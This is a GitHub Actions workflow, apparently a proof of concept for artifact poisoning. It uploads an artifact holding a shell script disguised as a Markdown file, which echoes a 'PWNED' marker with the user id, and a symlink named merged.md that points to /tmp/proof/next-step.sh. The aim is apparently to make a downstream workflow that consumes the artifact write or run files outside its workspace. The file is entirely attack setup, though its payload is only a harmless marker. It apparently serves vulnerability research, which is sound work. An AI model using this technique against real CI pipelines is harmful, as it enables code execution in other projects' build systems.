name: Producer Bench
on:
  workflow_dispatch:
jobs:
  make:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact dir with symlink
        run: |
          mkdir -p art
          printf '#!/bin/sh\necho PWNED-BY-ARTIFACT-SYMLINK uid=$(id -u)\n' > art/Linux-default-output.md
          echo 1 > art/NR
          ln -s /tmp/proof/next-step.sh art/merged.md
          ls -la art
      - uses: actions/upload-artifact@v4
        with:
          name: md-output
          path: art/
          overwrite: true
